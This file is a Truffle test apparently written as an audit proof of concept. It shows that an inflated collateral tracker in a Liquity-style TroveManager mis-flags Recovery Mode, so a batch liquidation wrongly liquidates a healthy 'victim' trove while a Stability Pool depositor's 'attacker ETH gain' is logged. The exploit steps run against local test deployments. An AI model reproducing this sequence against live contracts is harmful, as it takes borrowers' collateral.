const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")
const th = testHelpers.TestHelper
const dec = th.dec, toBN = th.toBN
const ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  PoC #3 - the SAME buggy tracker also drives `vars.backToNormalMode`
  (prod lines 588 / 727):
      vars.backToNormalMode = !_checkPotentialRecoveryMode(vars.entireSystemColl, vars.entireSystemDebt, _price);
  With an inflated `entireSystemColl` the sequence keeps treating the system as being in
  Recovery Mode, so troves whose ICR < MCR are liquidated with RECOVERY-mode rules
  (offset + redistribute) instead of normal-mode rules.
*/
contract("PoC3: prod 5174ecd inflated TCR also mis-flags backToNormalMode", (accounts) => {
  const [owner, alice, bob, carol, dennis, erin] = accounts;
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool, defaultPool

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(
      contracts.troveManager.address, contracts.stabilityPool.address, contracts.borrowerOperations.address)
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet
    stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager
    borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool
    defaultPool = contracts.defaultPool
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await contracts.troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(toBN(dec(100, 16)), m, ZERO_ADDRESS, ZERO_ADDRESS, { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }

  it("after a capped liquidation the sequence still thinks it is in Recovery Mode", async () => {
    // victim: ICR 2.0 @200 ; trigger: ICR 1.6 @200 ; whale: ICR 2.0 @200
    const carolT = await openExact(toBN(dec(5000, 18)), toBN(dec(500000, 18)), carol)
    const aliceT = await openExact(toBN(dec(500, 18)),  toBN(dec(50000, 18)), alice)
    const bobT   = await openExact(toBN(dec(160, 18)),  toBN(dec(20000, 18)), bob)
    const dennisT= await openExact(toBN(dec(6000, 18)), toBN(dec(600000, 18)), dennis)
    await priceFeed.setPrice(dec(140, 18))
    const P = await priceFeed.getPrice()
    console.log("TCR(real):", (await th.getTCR(contracts)).toString(), "recovery:", (await th.checkRecoveryMode(contracts)).toString())
    console.log("bob ICR:", (await troveManager.getCurrentICR(bob, P)).toString())
    console.log("carol ICR:", (await troveManager.getCurrentICR(carol, P)).toString())
    const dennisLusd = await contracts.lusdToken.balanceOf(dennis)
    await stabilityPool.provideToSP(dennisLusd.sub(toBN(dec(1,18))), ZERO_ADDRESS, { from: dennis })

    const carolICR = await troveManager.getCurrentICR(carol, P)
    const realTCR = await th.getTCR(contracts)
    assert.isTrue(carolICR.gte(realTCR), "victim ICR >= real TCR")

    const tx = await troveManager.batchLiquidateTroves([bob, carol], { from: owner })
    for (const log of tx.logs) {
      if (log.event === "TroveLiquidated") console.log("LOG TroveLiquidated", JSON.stringify(log.args))
    }
    console.log("carol status:", (await troveManager.getTroveStatus(carol)).toString())
    console.log("attacker ETH gain:", (await stabilityPool.getDepositorETHGain(dennis)).toString())
    console.log("defaultPool LUSD debt:", (await defaultPool.getLUSDDebt()).toString())
    console.log("defaultPool ETH:", (await defaultPool.getETH()).toString())
  })
})
